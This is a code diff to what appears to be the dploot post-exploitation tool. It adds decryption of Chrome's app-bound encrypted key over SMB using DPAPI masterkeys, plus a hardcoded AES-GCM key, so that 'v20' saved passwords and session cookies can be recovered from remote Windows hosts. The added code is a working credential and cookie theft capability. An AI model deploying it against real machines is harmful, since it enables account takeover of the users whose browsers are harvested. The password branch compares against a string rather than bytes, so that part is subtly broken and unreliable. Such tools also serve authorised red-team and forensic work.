@@ -1,19 +1,58 @@
 import base64
+from Cryptodome.Cipher import AES
+from binascii import hexlify
 import json
 import logging
 import tempfile
 import sqlite3
 from typing import Any, List, Tuple
-from dploot.lib.crypto import decrypt_chrome_password
+from impacket.structure import Structure
+
 
 from dploot.lib.dpapi import decrypt_blob, find_masterkey_for_blob
 from dploot.lib.smb import DPLootSMBConnection
 from dploot.lib.target import Target
+from dploot.lib.crypto import decrypt_chrome_password
 from dploot.lib.utils import datetime_to_time
 from dploot.triage.masterkeys import Masterkey
 from dataclasses import dataclass
 
 
+
+class AppBoundKey(Structure):
+    def __init__(self, data=None, alignment=0):
+        super().__init__(data, alignment)
+
+        self._key = None
+    
+    structure = (
+        ("PathLength", "<L=0"),
+        ("_Path", "_-Path", 'self["PathLength"]'),
+        ("Path", ":"),
+        ("KeyLength", "<L=0"),
+        ("_Key", "_-Key", 'self["KeyLength"]'),
+        ("Key", ":"),
+    )
+
+    def dump(self):
+        print("[APP BOUND KEY]")
+        print("Path:\t%s" % (self["Path"]))
+        print("Key:\t%s" % (hexlify(self["Key"])))
+
+    @property
+    def key(self):
+        if self._key is not None or self["Key"] is None:
+            return self._key
+        if len(self["Key"]) == 32:
+            self._key = self["Key"]
+        else:
+            key = base64.b64decode("sxxuJBrIRnKNqcH6xJNmUc/7lE0UOrgWJ2vMbaAoR4c=")
+            iv = self["Key"][1:13]
+            encrypted_text = self["Key"][13:45]
+            cipher = AES.new(key, AES.MODE_GCM, nonce=iv)
+            self._key = cipher.decrypt(ciphertext=encrypted_text)
+        return self._key
+    
 @dataclass
 class LoginData:
     winuser: str
@@ -189,6 +228,7 @@ class BrowserTriage:
         profiles = ["Default"]
         for browser, paths in self.user_generic_chrome_paths.items():
             aeskey = None
+            app_bound_key = None
             aesStateKey_bytes = self.conn.readFile(
                 shareName=self.share,
                 path=paths["aesStateKeyPath"] % user,
@@ -211,6 +251,24 @@ class BrowserTriage:
                         aeskey = decrypt_blob(
                             blob_bytes=dpapi_blob, masterkey=masterkey
                         )
+                
+                if "app_bound_encrypted_key" in aesStateKey_json["os_crypt"]:
+                    app_bound_blob = base64.b64decode(aesStateKey_json["os_crypt"]["app_bound_encrypted_key"])
+                    dpapi_blob = app_bound_blob[4:] # Trim off APPB
+                    masterkey = find_masterkey_for_blob(
+                            dpapi_blob, masterkeys=self.masterkeys
+                        )
+                    if masterkey is not None:
+                        intermediate_key = decrypt_blob(
+                            blob_bytes=dpapi_blob, masterkey=masterkey
+                        )
+                        masterkey = find_masterkey_for_blob(
+                            intermediate_key, masterkeys=self.masterkeys
+                        )
+                        if masterkey:
+                            app_bound_key = AppBoundKey(decrypt_blob(
+                                blob_bytes=intermediate_key, masterkey=masterkey
+                            )).key
             for profile in profiles:
                 loginData_bytes = self.conn.readFile(
                     shareName=self.share,
@@ -234,7 +292,18 @@ class BrowserTriage:
                     lines = query.fetchall()
                     if len(lines) > 0:
                         for url, username, encrypted_password in lines:
-                            password = decrypt_chrome_password(encrypted_password, aeskey)
+                            password = None
+                            try:
+                                if encrypted_password[:3] == "v20":
+                                    password = decrypt_chrome_password(
+                                    encrypted_password, app_bound_key
+                                    )
+                                else:
+                                    password = decrypt_chrome_password(
+                                    encrypted_password, aeskey
+                                    )
+                            except Exception as e:
+                                logging.debug(f"Could not decrypt chrome cookie: {e}")
                             login_data_decrypted = LoginData(
                                 winuser=user,
                                 browser=browser,
@@ -278,9 +347,18 @@ class BrowserTriage:
                                     last_access_utc,
                                     encrypted_cookie,
                                 ) in lines:
-                                    decrypted_cookie_value = decrypt_chrome_password(
-                                        encrypted_cookie, aeskey
-                                    )
+                                    decrypted_cookie_value = None
+                                    try:
+                                        if encrypted_cookie[:3] == b"v20":
+                                            decrypted_cookie_value = decrypt_chrome_password(
+                                            encrypted_cookie, app_bound_key
+                                            )
+                                        else:
+                                            decrypted_cookie_value = decrypt_chrome_password(
+                                            encrypted_cookie, aeskey
+                                            )
+                                    except Exception as e:
+                                        logging.debug(f"Could not decrypt chrome cookie: {e}")
                                     cookie = Cookie(
                                         winuser=user,
                                         browser=browser,
